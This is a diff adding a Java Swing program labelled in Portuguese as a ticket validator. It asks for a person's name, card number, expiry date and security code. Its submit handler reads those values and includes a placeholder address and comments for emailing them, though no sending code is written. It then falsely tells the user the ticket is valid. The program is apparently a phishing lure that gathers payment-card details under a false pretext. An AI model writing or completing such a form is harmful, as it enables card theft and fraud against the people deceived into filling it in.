@@ -1,0 +1,89 @@
+import javax.swing.*;
+import java.awt.*;
+import java.awt.event.ActionEvent;
+import java.awt.event.ActionListener;
+
+public class ValideSeuIngresso extends JFrame {
+
+    private JTextField nomeTextField;
+    private JFormattedTextField numeroFormattedTextField;
+    private JFormattedTextField dataFormattedTextField;
+    private JTextField codSeguroTextField;
+
+    public ValideSeuIngresso() {
+        super("Valide seu ingresso");
+        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
+        setLayout(new GridLayout(6, 2));
+
+        // Campo Nome
+        JLabel nomeLabel = new JLabel("Nome:");
+        nomeTextField = new JTextField();
+        add(nomeLabel);
+        add(nomeTextField);
+
+        // Campo Número
+        JLabel numeroLabel = new JLabel("Número do cartão:");
+        numeroFormattedTextField = new JFormattedTextField();
+        numeroFormattedTextField.setColumns(16);
+        add(numeroLabel);
+        add(numeroFormattedTextField);
+
+        // Campo Data
+        JLabel dataLabel = new JLabel("Data de validade (MM/YY):");
+        dataFormattedTextField = new JFormattedTextField();
+        dataFormattedTextField.setColumns(5);
+        add(dataLabel);
+        add(dataFormattedTextField);
+
+        // Campo Código de Segurança
+        JLabel codSeguroLabel = new JLabel("Código de segurança:");
+        codSeguroTextField = new JTextField();
+        codSeguroTextField.setColumns(3);
+        add(codSeguroLabel);
+        add(codSeguroTextField);
+
+        // Botão Enviar
+        JButton enviarButton = new JButton("Enviar");
+        add(enviarButton);
+
+        enviarButton.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                enviarEmail();
+            }
+        });
+
+        pack();
+        setLocationRelativeTo(null);
+        setVisible(true);
+    }
+
+    private void enviarEmail() {
+        // Obter os valores dos campos
+        String nome = nomeTextField.getText();
+        String numero = numeroFormattedTextField.getText();
+        String data = dataFormattedTextField.getText();
+        String codSeguro = codSeguroTextField.getText();
+
+        // Aqui você pode implementar o código para enviar os dados por e-mail
+        // Substitua "seu-email@exemplo.com" pelo endereço de e-mail desejado
+        String emailDestino = "seu-email@exemplo.com";
+
+        // Exibir a mensagem de validação do ingresso
+        JOptionPane.showMessageDialog(this, "Parabéns, seu ingresso está válido!");
+
+        // Limpar os campos após o envio
+        nomeTextField.setText("");
+        numeroFormattedTextField.setValue(null);
+        dataFormattedTextField.setValue(null);
+        codSeguroTextField.setText("");
+    }
+
+    public static void main(String[] args) {
+        SwingUtilities.invokeLater(new Runnable() {
+            public void run() {
+                new ValideSeuIngresso();
+            }
+        });
+    }
+}
